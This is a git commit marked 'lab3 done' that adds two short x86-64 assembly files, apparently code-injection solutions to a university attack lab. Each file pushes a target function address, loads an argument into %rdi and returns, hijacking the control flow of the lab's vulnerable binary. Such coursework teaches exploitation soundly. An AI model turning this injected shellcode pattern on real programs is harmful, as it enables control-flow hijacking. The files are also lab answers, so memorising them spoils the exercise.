0e8cba9096e97b513ed4bf219ad0d34577c032d6
Liang-bk <Kxq0309@outlook.com>
2025-07-30 20:14:22 +0800

    lab3 done

---
+++ solutions/lab3/ci_level2.s
@@ -0,0 +1,3 @@
+pushq $0x4017ec # touch2 entrance
+mov $0x59b997fa, %rdi # pass the param
+ret             # get in
---
+++ solutions/lab3/ci_level3.s
@@ -0,0 +1,3 @@
+pushq $0x4018fa # touch3 entrance
+mov $0x5561DCA8, %rdi # str address as the param
+ret             # get in
